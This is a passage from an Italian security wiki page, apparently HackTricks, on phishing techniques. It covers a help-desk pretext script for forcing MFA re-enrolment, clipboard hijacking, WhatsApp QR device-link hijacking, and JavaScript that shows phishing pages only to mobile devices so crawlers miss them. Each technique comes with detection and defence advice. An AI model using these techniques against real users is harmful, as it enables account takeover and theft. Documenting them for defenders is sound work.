Oltre al classico push-bombing, gli operatori si limitano a **forzare una nuova registrazione MFA** durante la chiamata all'help desk, invalidando il token esistente dell'utente.  Qualsiasi richiesta di login successiva appare legittima alla vittima.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Monitora gli eventi AzureAD/AWS/Okta in cui **`deleteMFA` + `addMFA`** si verificano **a distanza di pochi minuti dallo stesso IP**.



## Clipboard Hijacking / Pastejacking

Gli aggressori possono copiare silenziosamente comandi malevoli negli appunti della vittima da una pagina web compromessa o typosquatted, per poi indurre l'utente a incollarli all'interno di **Win + R**, **Win + X** o una finestra del terminale, eseguendo codice arbitrario senza alcun download o allegato.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### Hijacking del collegamento di un dispositivo WhatsApp tramite social engineering con QR
* Una pagina esca (ad esempio un falso “canale” di un ministero/CERT) mostra un QR di WhatsApp Web/Desktop e indica alla vittima di scansionarlo, aggiungendo silenziosamente l'aggressore come **dispositivo collegato**.<sup>[[10]](#references)</sup>
* L'aggressore ottiene immediatamente visibilità su chat e contatti finché la sessione non viene rimossa. In seguito, le vittime potrebbero visualizzare una notifica “nuovo dispositivo collegato”; i difensori possono cercare eventi imprevisti di collegamento di dispositivi poco dopo le visite a pagine QR non attendibili.

### Phishing con accesso condizionato al dispositivo mobile per eludere crawler e sandbox
Gli operatori applicano sempre più spesso un controllo basato sul dispositivo ai propri flussi di phishing, in modo che i crawler desktop non raggiungano mai le pagine finali. Un pattern comune consiste in un piccolo script che verifica la presenza di un DOM compatibile con il touch e invia il risultato a un endpoint del server; i client non mobili ricevono HTTP 500 (o una pagina vuota), mentre agli utenti mobili viene mostrato il flusso completo.<sup>[[6]](#references)</sup>

Snippet client minimale (logica tipica):
```html
<script src="/static/detect_device.js"></script>
```
Logica di `detect_device.js` (semplificata):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Comportamento del server osservato frequentemente:
- Imposta un cookie di sessione durante il primo caricamento.
- Accetta `POST /detect {"is_mobile":true|false}`.
- Restituisce 500 (o un placeholder) alle richieste GET successive quando `is_mobile=false`; fornisce il phishing solo se `true`.

Indicatori euristici per la ricerca e il rilevamento:
- Query urlscan: `filename:"detect_device.js" AND page.status:500`
- Telemetria web: sequenza di `GET /static/detect_device.js` → `POST /detect` → HTTP 500 per i dispositivi non mobile; i percorsi legittimi delle vittime mobile restituiscono 200 con HTML/JS successivi.
- Bloccare o esaminare attentamente le pagine che condizionano il contenuto esclusivamente a `ontouchstart` o a controlli simili del dispositivo.

Suggerimenti per la difesa:
- Eseguire i crawler con fingerprint simili a quelli mobile e JS abilitato per rivelare i contenuti sottoposti a gating.
- Generare un alert per risposte 500 sospette successive a `POST /detect` su domini registrati di recente.

## Riferimenti

- [1] [Generating Domain Variations Used in Phishing (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
- [2] [Finding Phishing: Tools and Techniques (0xPatrik)](https://0xpatrik.com/phishing-domains/)
- [3] [Robando sesiones y bypasseando 2FA con EvilnoVNC (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [4] [How To Install and Configure DKIM with Postfix on Debian Wheezy (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [5] [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [6] [Silent Smishing – mobile-gated phishing infra and heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [7] [The Next Frontier of Runtime Assembly Attacks: Leveraging LLMs to Generate Phishing JavaScript in Real Time](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [8] [Impersonation, Click Hijacking, and TDS: Inside a Malware Distribution Ecosystem](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [9] [Hijacking traffic to Microsoft's windows.com with bitflipping (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [10] [Love? Actually: Fake dating app used as lure in targeted spyware campaign in Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [11] [ESET GhostChat IoCs and samples](https://github.com/eset/malware-ioc/tree/master/ghostchat)

{{#include ../../banners/hacktricks-training.md}}
